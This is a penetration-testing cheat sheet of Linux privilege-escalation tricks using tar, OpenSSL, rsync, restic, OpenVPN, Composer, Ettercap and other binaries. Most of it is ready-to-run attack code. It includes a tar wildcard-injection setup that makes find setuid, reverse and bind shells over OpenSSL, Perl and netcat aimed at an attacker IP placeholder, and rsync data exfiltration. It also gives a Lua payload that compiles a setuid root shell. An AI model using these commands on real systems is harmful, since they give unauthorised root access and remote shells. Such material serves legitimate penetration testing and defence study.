# GTFO Binaries

### Tar

If tar is allowed in sudoers with a wildcard command we can abuse that for privilege escalation. Filenames will be interpreted as command line arguments therefore we can create the following setup:

```text
-rw-r–r–. 1 xxx xxx 0 Oct 28 19:19 –checkpoint=1
-rw-r–r–. 1 xxx xxx 0 Oct 28 19:17 –checkpoint-action=exec=sh payload.sh
-rwxr-xr-x. 1 xxx xxx 12 Oct 28 19:17 payload.sh
```

To create the files use:

```text
echo "chmod u+s /usr/bin/find" > payload.sh
echo "" > "--checkpoint-action=exec=sh payload.sh"
echo "" > --checkpoint=1
```

Using find as the payload has the charm that we can execute commands via `find f1 -exec "whoami" \;` \(file f1 must exist\)

### TCPDump

With `-z` you can execute commands via TCPDump.

### OpenSSL

Openssl can read files and write into files via network. So it can be used for exfil and infil of Data. In addition a bind or reverse shell can be implemented via OpenSSL, e.g.:

```bash
openssl.exe s_client -quiet -connect <ip>:<port> | cmd.exe | openssl.exe s_client -quiet -connect <ip>:<port>`
```

### Rsync

If permissions allow it one can get RCE with RSync by overwriting the cronjobs file.

```bash
* * * * * root perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

Download folder:

```bash
rsync -r rsync://user@ip/<remote_dir>/ .
```

Upload folder:

```bash
rsync -vvaP -6 <local dir> "rsync://user@ip/<remote dir>"
```

### LuksOpen

#### Sudo

Create a local luks volume on the attacker box, place a setuid binary and then mount it on the target.

```text
dd if=/dev/zero of=/tmp/vol bs=1M count=512
sudo cryptsetup -vy luksFormat /tmp/vol
sudo cryptsetup luksOpen /tmp/vol vol
sudo mkfs.ext4 /dev/mapper/vol
sudo mount /dev/mapper/vol /mnt
sudo umount /mnt && sudo cryptsetup luksClose vol
```

### Restic:

#### Sudo

```bash
sudo /usr/bin/restic backup -r rest/ -r sftp:<name>@127.0.0.1:/var/tmp/rest -o sftp.command="nc.traditional -lp 2000 -e /bin/bash" `
```

### Journalctl

#### Sudo

```bash
stty rows 2 (to force less to be used)
/usr/bin/sudo /usr/bin/journalctl -n5 <...>
```

### OpenVPN

#### Sudo

```text
sudo openvpn --script-security 2 --up payload.sh --dev tun1 &
```

Put your payload into payload.sh.

### Composer

#### Sudo

Create composer.json:

```text
{
    "scripts": {
        "test": [
            "@clearCache",
            "phpunit"
        ],
        "clearCache": "<shell command>"
    }
}
```

Then run :

```text
sudo /usr/bin/composer run-script test
```

### Ettercap

#### Suid

```text
package.cpath = "/tmp/?.so"
payload = [[
#include <unistd.h>
static int luaopen_hello = 0;
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  setuid(geteuid());
  setgid(getegid());
  execve(argv[0], argv, envp);
}
]]
local out = assert(io.open("/tmp/inluaofaname.c", "wb"))
out:write(payload)
out:close()
os.execute("gcc /tmp/inluaofaname.c -o /tmp/inluaofaname.so -shared -fPIC")
require "inluaofaname"
```

```text
./ettercap --lua-script ./x.lua -Tq
```

This can also be used with nmap nse scripts, see [https://www.elttam.com/blog/lua-suid-shells/](https://www.elttam.com/blog/lua-suid-shells/). 

### Resources

[https://gtfobins.github.io/](https://gtfobins.github.io/)

